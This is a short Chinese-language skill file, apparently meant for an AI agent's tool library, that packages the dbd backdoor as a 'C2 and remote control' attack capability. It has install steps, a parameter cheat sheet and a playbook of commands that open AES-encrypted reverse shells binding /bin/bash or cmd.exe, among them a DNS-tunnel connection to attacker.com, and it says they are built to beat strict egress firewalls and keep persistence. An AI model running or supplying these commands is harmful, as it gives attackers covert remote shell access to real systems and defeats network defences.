---
name: dbd-dns-tunnel-shell
description: dbd: TCP 被封改 DNS 隧道反弹。信号:持久化,后门,监听反弹(TCP),DNS 模式连出,AES 加密信道。
---

# dbd

- 攻击大类:C15 C2与远控
- 上游仓库:https://github.com/gitdurandal/dbd
- 上游 License:GPL-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/gitdurandal/dbd && make
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./dbd -l -p 443 -e /bin/bash` | 监听反弹(TCP) |
| `./dbd -l -p 53 -e cmd.exe` | Windows shell |
| `./dbd -t 10.0.0.5 -p 53 -e /bin/sh` | DNS 模式连出 |
| `-k password` | AES 加密信道 |
| `-m dns` | DNS 隧道模式 |

## 攻击场景 Playbook

### TCP 被封改 DNS 隧道反弹

```bash
./dbd -l -p 53 -e /bin/bash
./dbd -t attacker.com -p 53 -e /bin/bash -m dns
# 仅放行 DNS 的内网出网通道
```

## 注意事项

DNS 隧道加密反弹 shell,支持 TCP/DNS 双模式+AES 加密,对抗严格出口防火墙。
